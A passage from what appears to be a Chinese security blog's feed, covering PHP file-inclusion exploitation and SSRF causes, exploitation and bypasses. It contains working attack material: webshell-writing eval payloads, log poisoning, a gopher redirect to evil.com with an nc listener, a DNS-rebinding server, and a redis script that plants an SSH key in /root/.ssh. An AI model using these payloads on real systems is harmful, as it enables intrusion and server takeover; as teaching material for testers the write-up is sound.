//Mysql配置信息</li></ul></li><li>Linux:<ul><li>~/.ssh/authorized_keys</li><li>/etc/passwd</li><li>/etc/my.cnf</li><li>/etc/httpd/conf/httpd.conf</li><li>/var/log/apache2/access.log</li><li>/var/log/httpd/access_log</li></ul></li></ul><h2 id="包含图片马GetShell"><a href="#包含图片马GetShell" class="headerlink" title="包含图片马GetShell"></a>包含图片马GetShell</h2><p>首先上传图片马img.gif:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后包含图片马，后缀名无限制：</p><p><img src="/php-文件包含利用/1549593738249.png" alt="1549593738249"></p><h2 id="包含日志GetShell"><a href="#包含日志GetShell" class="headerlink" title="包含日志GetShell"></a>包含日志GetShell</h2><p>先访问<code>/include.php?file=&lt;?=&#96;ls&#96;?&gt;</code>，将命令写入日志。</p><p><img src="/php-文件包含利用/1549594868535.png" alt="1549594868535"></p><p>再包含日志GetShell：</p><p><img src="/php-文件包含利用/1549594747532.png" alt="1549594747532"></p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p><code>php://filter</code>可以用来结合base64读取php源代码，payload为：<code>php://filter/read=convert.base64-encode/resource=include.php</code></p><p><img src="/php-文件包含利用/1549595279613.png" alt="1549595279613"></p><h2 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h2><ul><li>%00截断<ul><li>?file=../../../etc/pwd%00</li></ul></li><li>路径长度阶段<ul><li>?file=../../../etc/pwd/././.[…]/././.</li><li>?file=../../../boot.ini/….[…]………</li></ul></li></ul><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>需要All_url_fopen=On(默认开启)和Allow_url_include=On(默认关闭)</p><h2 id="直接包含远程一句话"><a href="#直接包含远程一句话" class="headerlink" title="直接包含远程一句话"></a>直接包含远程一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include.php?file=http://127.0.0.2/a.txt</span><br></pre></td></tr></table></figure><p>a.txt:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php @eval($_POST[xxx]); ?&gt;"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><code>php://input</code>可以将post部分请求作为一个php的只读文件流</p><p><img src="/php-文件包含利用/1549596283877.png" alt="1549596283877"></p><p>生成一句话payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval($_POST['xxxser']);?&gt;"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>PHP文件包含漏洞，<a href="https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html" target="_blank" rel="noopener">https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html</a></li><li>文件包含漏洞，<a href="https://www.cnblogs.com/bmjoker/p/9035259.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9035259.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;本地文件包含&quot;&gt;&lt;a href=&quot;#本地文件包含&quot; class=&quot;headerlink&quot; title=&quot;本地文件包含&quot;&gt;&lt;/a&gt;本地文件包含&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
      
    
    </summary>
    
      <category term="PHP" scheme="http://anemone.top/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://anemone.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>SSRF成因、利用和防御</title>
    <link href="http://anemone.top/ssrf-SSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
    <id>http://anemone.top/ssrf-SSRF成因、攻击和防御/</id>
    <published>2019-02-05T07:09:20.000Z</published>
    <updated>2019-09-22T10:14:18.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF成因"><a href="#SSRF成因" class="headerlink" title="SSRF成因"></a>SSRF成因</h1><p>SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证，诸如如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $ch = CURL_INIT();</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_URL, $url);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_HEADER, <span class="keyword">FALSE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">TRUE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">    <span class="comment">// 允许302跳转</span></span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">TRUE</span>);</span><br><span class="line">    $res = CURL_EXEC($ch);</span><br><span class="line">    <span class="comment">// 设置CONTENT-TYPE</span></span><br><span class="line">    CURL_CLOSE($ch) ;</span><br><span class="line">    <span class="comment">//返回响应</span></span><br><span class="line">    <span class="keyword">echo</span> $res;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就如上文所说，通过控制url参数可以使服务器可访问人任意网站，如<a href="http://localhost/ssrf.php?url=http://www.baidu.com：" target="_blank" rel="noopener">http://localhost/ssrf.php?url=http://www.baidu.com：</a></p><p><img src="/ssrf-SSRF成因、攻击和防御/1549351620627.png" alt="1549351620627"></p><p>由于是服务端产生的跳转，因此用户这里看不到访问百度的请求，也因此攻击者可以利用其探索内网资源。</p><p>参考猪猪侠的PPT，容易发生SSRF漏洞的地方有：</p><ul><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffpmg、ImageMagic、DOCX、PDF、XML处理器）<ul><li>FFmpeg: concat： <a href="http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd" target="_blank" rel="noopener">http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd</a></li><li>ImageMagick: fill ‘url(<a href="http://ssrf.wuyun.org" target="_blank" rel="noopener">http://ssrf.wuyun.org</a>)’</li><li>SVG, JPG, XML, Json</li></ul></li></ul><p>容易发生SSRF漏洞的服务有：</p><ol><li>图片加载与下载：通过URL地址加载或下载图片</li><li>Webhooks</li><li>通过URL地址分享网页内容</li><li>转码服务</li><li>在线翻译</li><li>图片、文章收藏功能</li><li>未公开的api实现以及其他调用URL的功能</li><li>从URL关键字中寻找</li></ol><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>总的来说，一个网站存在SSRF则会有如下利用点</p><ul><li><p>服务探测</p><p>关键在于对通过<strong>报错信息、响应时间</strong>判断是否服务是否存在</p></li><li><p>文件读取</p><p>主要使用file协议对文件进行读取操作</p></li><li><p>对内网服务进行攻击（如redis写文件）</p></li><li><p>使用FastCGI进行远程命令执行</p></li><li><p>SSRF转反射式XSS</p><p>如：<code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></p></li><li><p>在PDF中嵌入脚本</p><p>使用<a href="https://pdfcrowd.com/#convert_by_input，将html嵌入pdf中：" target="_blank" rel="noopener">https://pdfcrowd.com/#convert_by_input，将html嵌入pdf中：</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">”file:///etc/passwd”</span> <span class="attr">width</span>=<span class="string">”400</span>" <span class="attr">height</span>=<span class="string">”400</span>"&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">document.write(document.location)</span>&gt;</span> -- to know the path and some times to know what os they are using at backend</span><br></pre></td></tr></table></figure></li></ul><h2 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h2><p>支持的协议远不止这些，仅列出常用的：</p><ul><li><p>file://</p><p>用于读取本地文件，如：<code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p></li><li><p>http:// &amp; https://</p><p>用于访问内网http服务</p></li><li><p>ftp://</p><p>访问FTP服务</p></li><li><p>dict://xxx/info</p><p>可以泄露软件版本，或是操作内网redis服务等</p></li><li><p>gopher://</p><p>java支持，php需要开启Gopher wrapper，%0a用于换行，具体用法如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php</span><br><span class="line">&lt;?php</span><br><span class="line">        header(&apos;Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest&apos;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">evil.com:# nc -v -l 12346</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12346)</span><br><span class="line">Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)</span><br><span class="line">HI</span><br><span class="line">Multiline</span><br><span class="line">test</span><br></pre></td></tr></table></figure></li></ul><h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><h2 id="绕过IP限制"><a href="#绕过IP限制" class="headerlink" title="绕过IP限制"></a>绕过IP限制</h2><h3 id="十六进制IP"><a href="#十六进制IP" class="headerlink" title="十六进制IP"></a>十六进制IP</h3><p>如：0xA000001=10.0.0.1</p><h3 id="十进制IP"><a href="#十进制IP" class="headerlink" title="十进制IP"></a>十进制IP</h3><p>如：167772161=10.0.0.1</p><h3 id="八进制IP"><a href="#八进制IP" class="headerlink" title="八进制IP"></a>八进制IP</h3><p>如 012.0.0.1=10.0.0.1</p><h2 id="绕过Domain限制"><a href="#绕过Domain限制" class="headerlink" title="绕过Domain限制"></a>绕过Domain限制</h2><h3 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a><a href="http://xip.io" target="_blank" rel="noopener">xip.io</a></h3><ul><li>如：<a href="http://www.baidu.com.192.168.1.10.xip.io（将www.baidu.com地址解析到192.168.1.10）" target="_blank" rel="noopener">http://www.baidu.com.192.168.1.10.xip.io（将www.baidu.com地址解析到192.168.1.10）</a></li></ul><h3 id="nip-io"><a href="#nip-io" class="headerlink" title="nip.io"></a><a href="http://nip.io/" target="_blank" rel="noopener">nip.io</a></h3><h3 id="特殊字母"><a href="#特殊字母" class="headerlink" title="特殊字母"></a>特殊字母</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com</span><br><span class="line"></span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h3 id="HTTP-基础认证"><a href="#HTTP-基础认证" class="headerlink" title="HTTP 基础认证"></a>HTTP 基础认证</h3><p>如：<a href="http://xxx.com@attacker.com" target="_blank" rel="noopener">http://xxx.com@attacker.com</a></p><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>基本原理是自建DNS服务器，使第一次解析为外网ip，第二次解析为内网ip</p><p>在自己域名上绑定A记录和NS记录：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549437045205.png" alt="1549437045205"></p><p>A记录指将ns1.anemone.top解析到118.x.x.184</p><p>NS记录指子域名test.anemone.top由ns1.anemone.top来解析</p><p>同时在一个dns服务（这里我在腾讯云上没试验成功，猜测是腾讯云屏蔽了udp端口的入向）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @file dns_server.py</span></span><br><span class="line"><span class="comment"># @brief dns_server</span></span><br><span class="line"><span class="comment"># @author Anemone95,x565178035@126.com</span></span><br><span class="line"><span class="comment"># @version 1.0</span></span><br><span class="line"><span class="comment"># @date 2019-02-06 14:58</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(name+<span class="string">" ===&gt; "</span>+ip)</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><p>结果（只能模拟一下效果）：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549441559220.png" alt="1549441559220"></p><h2 id="绕过协议限制"><a href="#绕过协议限制" class="headerlink" title="绕过协议限制"></a>绕过协议限制</h2><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>攻击者建立<a href="http://127.0.0.1:8888/302.php：" target="_blank" rel="noopener">http://127.0.0.1:8888/302.php：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location:  dict://127.0.0.1:6379/set:1:helo"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着访问靶机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=http://127.0.0.1:8888/302.php</span><br></pre></td></tr></table></figure><p>可以看到脆弱服务器6379端口收到了请求，协议被绕过：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549355712656.png" alt="1549355712656"></p><h3 id="使用-0d-0a-r-n"><a href="#使用-0d-0a-r-n" class="headerlink" title="使用%0d%0a(\r\n)"></a>使用%0d%0a(\r\n)</h3><p>之所以要使用其他协议是因为http的get请求没有换行，那么在url中加上<code>%0d%0a</code>就有可能模拟一个换行操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">operator=http://wuyun.org:6379/helo</span><br><span class="line">%0d%0a(\r\n)</span><br><span class="line">config set dir /etc/cron.d/</span><br><span class="line">%0d%0a(\r\n)</span><br><span class="line">quit%0d%0a(\r\n)</span><br></pre></td></tr></table></figure><h2 id="Gopher利用Redis示例"><a href="#Gopher利用Redis示例" class="headerlink" title="Gopher利用Redis示例"></a>Gopher利用Redis示例</h2><p>gopher://协议可以模拟出tcp client的效果，因此可以模拟redis-cli，若服务器redis存在漏洞的话，就可以通过该方法提权。</p><p>准备一个普通redis攻击时用的脚本，注意192.168.99.100和6379需要替换成自己的redis IP和端口（不是攻击者的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>; cat ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>) &gt; upload.txt</span><br><span class="line">cat ~/upload.txt | redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> tmp</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x get tmp</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x quit</span><br></pre></td></tr></table></figure><p>关于脚本的解释可以看<a href="http://anemone.top/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/">redis未授权&amp;弱密码漏洞复现和防护</a></p><p>拦截6379的数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:192.168.70.128:6379 2&gt;&amp;1|tee socat.log</span><br></pre></td></tr></table></figure><p>执行脚本，将攻击流量打到测试机器上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash shell.sh 127.0.0.1 4444</span><br></pre></td></tr></table></figure><p><img src="/ssrf-SSRF成因、攻击和防御/1549458278181.png" alt="1549458278181"></p><p>这时socat那看到攻击流量：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549458694665.png" alt="1549458694665"></p><p>使用脚本将攻击流量转换为gopher协议，先来了解一下socat日志记录tcp流的格式：</p><ul><li><p><code>&lt;</code>开头一行表示客户端发送来了一个tcp包，下面为包内容，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2019/02/06 21:58:17.968244  length=51 from=0 to=50</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$10\r</span><br><span class="line">/root/.ssh\r</span><br></pre></td></tr></table></figure></li><li><p><code>&gt;</code>开头一行表示服务器返回一个tcp包，下面为包内容，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; 2019/02/06 21:58:17.981363  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure></li></ul><p>基于以上格式，将客户端发送的tcp包转换为payload：</p><ul><li>将\r字符串替换成%0d%0a</li><li>空白行替换为%0a</li><li>空格替换成%20</li><li>再使用urlencode（给php时会做一次decode，curl再做一次decode）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line">socat_file=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#  socat_file='./socat.log'</span></span><br><span class="line"></span><br><span class="line">client_tcp=<span class="literal">True</span></span><br><span class="line"><span class="keyword">with</span> open(socat_file) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'&gt;'</span>):</span><br><span class="line">            client_tcp=<span class="literal">True</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'&lt;'</span>):</span><br><span class="line">            client_tcp=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> client_tcp:</span><br><span class="line">            <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">               <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">               <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                   exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                   <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                   line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                   exp = exp + line</span><br><span class="line">            <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">            <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">               exp = exp + <span class="string">'%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               line = line.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)</span><br><span class="line">               line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">               exp = exp + line</span><br><span class="line">exp=quote(exp)</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure><p>使用脚本生成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python socat2gopher.py socat.log</span><br></pre></td></tr></table></figure><p><img src="/ssrf-SSRF成因、攻击和防御/1549509311002.png" alt="1549509311002"></p><p>将exp用gopher协议发送（这里的192.168.70.128:6379是受害者内网的redis服务器）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span 